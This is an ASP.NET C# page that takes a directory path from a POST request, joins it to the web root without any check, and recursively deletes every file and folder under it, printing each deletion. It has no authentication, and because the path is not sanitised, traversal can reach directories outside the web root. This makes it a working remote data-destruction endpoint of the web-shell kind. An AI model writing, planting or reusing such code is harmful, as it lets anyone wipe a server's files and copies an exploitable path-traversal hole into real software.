<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Web.Hosting" %>

<script runat="server">
protected void Page_Load(object sender, EventArgs e){
	string root = HostingEnvironment.MapPath("~");
	string path = Request.Form["path"];
	if (path == null){
		Response.Write("need POST{path}!");
		return;
	}
	
	string dirPath = root + "/" + path;
	if (!Directory.Exists(dirPath)) {
		Response.Write(path + " is not a directory");
		return;
	}
	
	removeRecursive(dirPath);
	Response.Write("delete [" + path + "/]");
}

void removeRecursive(string path){
	string[] files = Directory.GetFiles(path);
	for(int i = 0; i < files.Length; i++){
		File.Delete(files[i]);
		Response.Write("delete file "+files[i]+" <br>\n");
	}
	
	string[] dirs = Directory.GetDirectories(path);
	for(int i = 0; i < dirs.Length; i++){
		removeRecursive(dirs[i]);
	}
	
	Response.Write("delete dir "+path+" <br>\n");
	Directory.Delete(path);
}
</script>
